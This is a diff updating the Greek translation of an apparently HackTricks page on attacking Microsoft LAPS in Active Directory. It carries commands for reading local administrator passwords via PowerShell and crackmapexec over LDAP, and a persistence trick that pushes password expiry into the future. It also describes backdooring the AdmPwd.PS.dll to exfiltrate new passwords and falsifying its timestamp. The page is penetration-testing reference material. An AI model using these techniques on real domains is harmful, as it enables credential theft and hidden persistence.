@@ -2,26 +2,26 @@
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team AWS του HackTricks)</strong></a><strong>!</strong></summary>
 
-* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε τη **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε να έχετε πρόσβαση στη **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 
 ## Βασικές Πληροφορίες
 
-Το Local Administrator Password Solution (LAPS) είναι ένα εργαλείο που χρησιμοποιείται για τη διαχείριση ενός συστήματος όπου τα **κωδικοί διαχειριστή**, οι οποίοι είναι **μοναδικοί, τυχαίοι και τακτικά αλλάζονται**, εφαρμόζονται σε υπολογιστές που έχουν ενταχθεί στον τομέα. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια εντός του Active Directory και είναι προσβάσιμοι μόνο από χρήστες που έχουν δοθεί άδεια μέσω των Λιστών Ελέγχου Πρόσβασης (ACLs). Η ασφάλεια των μεταδόσεων κωδικών από τον πελάτη στον διακομιστή εξασφαλίζεται με τη χρήση του **Kerberos έκδοση 5** και του **Σύνθετου Προτύπου Κρυπτογράφησης (AES)**.
+Η Λύση Τοπικού Διαχειριστή Κωδικού (LAPS) είναι ένα εργαλείο που χρησιμοποιείται για τη διαχείριση ενός συστήματος όπου οι **κωδικοί διαχειριστή**, οι οποίοι είναι **μοναδικοί, τυχαίοι και τακτικά αλλάζονται**, εφαρμόζονται σε υπολογιστές που έχουν ενταχθεί στον τομέα. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια εντός του Active Directory και είναι προσβάσιμοι μόνο από χρήστες που έχουν δοθεί άδεια μέσω Λιστών Ελέγχου Πρόσβασης (ACLs). Η ασφάλεια των μεταδόσεων κωδικών από τον πελάτη στον διακομιστή διασφαλίζεται με τη χρήση του **Kerberos έκδοση 5** και του **Προηγμένου Προτύπου Κρυπτογράφησης (AES)**.
 
-Στα αντικείμενα υπολογιστών του τομέα, η εφαρμογή του LAPS οδηγεί στην προσθήκη δύο νέων χαρακτηριστικών: **`ms-mcs-AdmPwd`** και **`ms-mcs-AdmPwdExpirationTime`**. Αυτά τα χαρακτηριστικά αποθηκεύουν τον **κωδικό διαχειριστή σε καθαρό κείμενο** και **τον χρόνο λήξης του**, αντίστοιχα.
+Στα αντικείμενα υπολογιστών του τομέα, η εφαρμογή της LAPS οδηγεί στην προσθήκη δύο νέων χαρακτηριστικών: **`ms-mcs-AdmPwd`** και **`ms-mcs-AdmPwdExpirationTime`**. Αυτά τα χαρακτηριστικά αποθηκεύουν τον **κωδικό διαχειριστή κειμένου** και **τον χρόνο λήξης του**, αντίστοιχα.
 
 ### Έλεγχος εάν είναι ενεργοποιημένο
 ```bash
@@ -38,9 +38,9 @@ Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs
 ```
 ### Πρόσβαση στον κωδικό πρόσβασης του LAPS
 
-Μπορείτε να **κατεβάσετε την ακατέργαστη πολιτική του LAPS** από `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` και στη συνέχεια να χρησιμοποιήσετε το **`Parse-PolFile`** από το πακέτο [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) για να μετατρέψετε αυτό το αρχείο σε μορφή αναγνώσιμη από ανθρώπους.
+Μπορείτε να **κατεβάσετε τη ρυθμιση LAPS** από `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` και στη συνέχεια να χρησιμοποιήσετε το **`Parse-PolFile`** από το πακέτο [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) για να μετατρέψετε αυτό το αρχείο σε μορφή αναγνώσιμη από ανθρώπους.
 
-Επιπλέον, τα **ενσωματωμένα LAPS PowerShell cmdlets** μπορούν να χρησιμοποιηθούν εάν είναι εγκατεστημένα σε ένα μηχάνημα στο οποίο έχουμε πρόσβαση:
+Επιπλέον, τα **ενσωματωμένα LAPS PowerShell cmdlets** μπορούν να χρησιμοποιηθούν αν είναι εγκατεστημένα σε έναν υπολογιστή στον οποίο έχουμε πρόσβαση:
 ```powershell
 Get-Command *AdmPwd*
 
@@ -73,7 +73,7 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 
 Το [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) διευκολύνει την απαρίθμηση των LAPS με διάφορες λειτουργίες.\
 Ένα από αυτά είναι η ανάλυση των **`ExtendedRights`** για **όλους τους υπολογιστές με ενεργοποιημένα τα LAPS.** Αυτό θα εμφανίσει **ομάδες** που είναι ειδικά **αναθετημένες να διαβάζουν τους κωδικούς LAPS**, οι οποίες συχνά είναι χρήστες σε προστατευμένες ομάδες.\
-Ένα **λογαριασμός** που έχει **συνδεθεί ένας υπολογιστής** σε έναν τομέα λαμβάνει `Όλα τα Επεκτεινόμενα Δικαιώματα` πάνω σε αυτό τον υπολογιστή, και αυτό το δικαίωμα δίνει στον **λογαριασμό** τη δυνατότητα να **διαβάσει κωδικούς πρόσβασης**. Η απαρίθμηση μπορεί να δείξει έναν λογαριασμό χρήστη που μπορεί να διαβάσει τον κωδικό LAPS σε έναν υπολογιστή. Αυτό μπορεί να μας βοηθήσει να **στοχεύσουμε συγκεκριμένους χρήστες του AD** που μπορούν να διαβάσουν τους κωδικούς LAPS.
+Ένα **λογαριασμός** που έχει **ενταχθεί σε έναν υπολογιστή** σε έναν τομέα λαμβάνει `Όλα τα Επεκτεινόμενα Δικαιώματα` πάνω σε αυτό τον υπολογιστή, και αυτό το δικαίωμα δίνει στον **λογαριασμό** τη δυνατότητα να **διαβάζει κωδικούς πρόσβασης**. Η απαρίθμηση μπορεί να δείξει έναν λογαριασμό χρήστη που μπορεί να διαβάσει τον κωδικό LAPS σε έναν υπολογιστή. Αυτό μπορεί να μας βοηθήσει να **στοχεύσουμε συγκεκριμένους χρήστες του AD** που μπορούν να διαβάσουν τους κωδικούς LAPS.
 ```powershell
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -97,16 +97,16 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
-## **Ανάκτηση Κωδικών LAPS με το Crackmapexec**
-Αν δεν υπάρχει πρόσβαση σε ένα powershell, μπορείτε να καταχραστείτε αυτό το προνόμιο απομακρυσμένα μέσω του LDAP χρησιμοποιώντας
+## **Απορρόφηση Κωδικών LAPS με το Crackmapexec**
+Εάν δεν υπάρχει πρόσβαση σε ένα powershell μπορείτε να καταχραστείτε αυτό το προνόμιο απομακρυσμένα μέσω LDAP χρησιμοποιώντας
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
-## **Μέθοδος Μόνιμης Παραμονής LAPS**
+## **Μέθοδος Μόνιμης Επιμονής LAPS**
 
 ### **Ημερομηνία Λήξης**
 
-Αφού γίνετε διαχειριστής, είναι δυνατόν να **αποκτήσετε τους κωδικούς πρόσβασης** και να **εμποδίσετε** ένα μηχάνημα από το **να ενημερώνει** τον **κωδικό πρόσβασης** του **θέτοντας την ημερομηνία λήξης στο μέλλον**.
+Αφού γίνετε διαχειριστής, είναι δυνατόν να **αποκτήσετε τους κωδικούς πρόσβασης** και να **εμποδίσετε** ένα μηχάνημα από το **να ενημερώνει** τον **κωδικό πρόσβασής του** με το **να ορίζετε την ημερομηνία λήξης στο μέλλον**.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
@@ -119,16 +119,16 @@ Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="2326099
 Ο κωδικός θα επαναφερθεί ακόμα και αν ένας **διαχειριστής** χρησιμοποιήσει το **`Reset-AdmPwdPassword`** cmdlet; ή αν η επιλογή **Do not allow password expiration time longer than required by policy** είναι ενεργοποιημένη στο LAPS GPO.
 {% endhint %}
 
-### Backdoor
+### Πίσω πόρτα
 
-Ο πρωτογενής κώδικας για το LAPS μπορεί να βρεθεί [εδώ](https://github.com/GreyCorbel/admpwd), επομένως είναι δυνατόν να τοποθετηθεί ένα backdoor στον κώδικα (μέσα στη μέθοδο `Get-AdmPwdPassword` στο αρχείο `Main/AdmPwd.PS/Main.cs` για παράδειγμα) που θα **εξαγάγει νέους κωδικούς ή θα τους αποθηκεύσει κάπου**.
+Ο πρωτογενής κώδικας για το LAPS μπορεί να βρεθεί [εδώ](https://github.com/GreyCorbel/admpwd), επομένως είναι δυνατόν να τοποθετηθεί μια πίσω πόρτα στον κώδικα (μέσα στη μέθοδο `Get-AdmPwdPassword` στο αρχείο `Main/AdmPwd.PS/Main.cs` για παράδειγμα) που θα **εξαγάγει νέους κωδικούς ή θα τους αποθηκεύσει κάπου**.
 
-Στη συνέχεια, απλά μεταγλωτίστε το νέο `AdmPwd.PS.dll` και ανεβάστε το στη μηχανή στο `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (και αλλάξτε την χρονοσφραγίδα).
+Στη συνέχεια, απλά μεταγλωττίστε το νέο `AdmPwd.PS.dll` και ανεβάστε το στο μηχάνημα στο `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (και αλλάξτε την χρονοσήμανση τροποποίησης).
 
 ## Αναφορές
 * [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
@@ -137,9 +137,9 @@ Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="2326099
 <summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 * Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή την [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
